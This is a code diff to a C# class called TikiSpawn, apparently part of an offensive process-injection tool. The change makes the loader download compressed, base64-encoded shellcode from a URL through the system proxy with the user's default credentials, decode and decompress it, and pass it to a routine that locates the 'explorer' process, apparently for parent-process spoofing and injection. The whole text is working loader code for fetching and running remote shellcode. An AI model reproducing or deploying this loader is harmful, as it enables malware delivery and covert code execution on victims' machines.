@@ -13,12 +13,13 @@ public class TikiSpawn
         Flame(@"", @"");
     }
 
-    private static string GetData(string url)
+    private static byte[] GetShellcode(string url)
     {
         WebClient client = new WebClient();
         client.Proxy = WebRequest.GetSystemWebProxy();
         client.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        return client.DownloadString(url);
+        string compressedEncodedShellcode = client.DownloadString(url);
+        return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
     }
 
     private static int FindProcessPid(string process)
@@ -41,7 +42,7 @@ public class TikiSpawn
 
     private void Flame(string binary, string url)
     {
-        byte[] shellcode = Convert.FromBase64String(GetData(url));
+        byte[] shellcode = GetShellcode(url);
         int ppid = FindProcessPid("explorer");
 
         if (ppid == 0)
